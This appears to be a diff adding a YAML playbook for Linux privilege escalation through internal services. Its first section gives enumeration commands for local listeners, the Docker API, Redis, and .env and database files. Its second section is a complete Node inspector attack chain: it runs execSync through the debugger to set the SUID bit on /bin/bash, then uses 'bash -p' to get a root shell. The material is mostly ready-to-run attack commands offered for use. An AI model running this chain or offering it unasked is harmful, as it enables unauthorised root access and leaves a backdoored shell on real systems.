@@ -1,0 +1,94 @@
+name: Linux Privilege Escalation - Internal Services
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE INTERNAL SERVICES
+# =========================================================
+- title: Enumerate Internal Services
+  mode: enum
+  info: |
+    Identify localhost-only services, developer tooling,
+    debug interfaces, and privileged internal applications.
+
+  entries:
+
+    - cmd: "ss -tunlp"
+      info: enumerate listening TCP/UDP services
+
+    - cmd: "netstat -tulpn"
+      info: alternative service enumeration
+
+    - cmd: "lsof -i -P -n"
+      info: enumerate open sockets and owning processes
+
+    - cmd: "ps aux"
+      info: inspect running processes
+
+    - cmd: "ps aux | grep -Ei 'node|docker|redis|jupyter|pm2|gunicorn|flask|java'"
+      info: identify common internal services
+
+    - cmd: "curl http://127.0.0.1:9229/json/list"
+      info: check Node inspector
+
+    - cmd: "curl http://127.0.0.1:2375/version"
+      info: check Docker API
+
+    - cmd: "redis-cli INFO"
+      info: check Redis access
+
+    - cmd: "find / -name '.env*' 2>/dev/null"
+      info: identify application configuration files
+
+    - cmd: "find / -name '*.db' 2>/dev/null"
+      info: identify local databases
+
+  notes:
+    - localhost-only services remain reachable after RCE
+    - internal services frequently trust local users
+    - developer/debug tooling commonly leads to privilege escalation
+    - focus on services running as root
+    - inspect unusual high ports
+    - application-layer privesc is often easier than kernel exploitation
+
+# =========================================================
+# [2] NODE INSPECTOR
+# =========================================================
+- title: Node Inspector
+  mode: chain
+  info: |
+    Abuse exposed Node.js debugging interfaces to execute
+    commands inside privileged Node processes.
+
+  entries:
+
+    - cmd: "ps aux | grep inspect"
+      info: identify inspect-enabled Node processes
+
+    - cmd: "ss -tunlp | grep 9229"
+      info: identify Node inspector listener
+
+    - cmd: "curl http://127.0.0.1:9229/json/list"
+      info: enumerate debugger targets
+
+    - cmd: "node inspect 127.0.0.1:9229"
+      info: attach to debugger
+
+    - cmd: 'exec("process.mainModule.require(\"child_process\").execSync(\"id\").toString()")'
+      info: verify command execution
+
+    - cmd: 'exec("process.mainModule.require(\"child_process\").execSync(\"chmod u+s /bin/bash\")")'
+      info: create SUID bash
+
+    - cmd: "bash -p"
+      info: spawn privileged shell
+
+    - cmd: "id"
+      info: verify root access
+
+  notes:
+    - default Node inspector port is 9229
+    - localhost binding does not protect against local attackers
+    - debugger access enables arbitrary JavaScript execution
+    - root-owned Node processes commonly lead to instant privesc
+    - process.mainModule.require bypasses restricted execution contexts
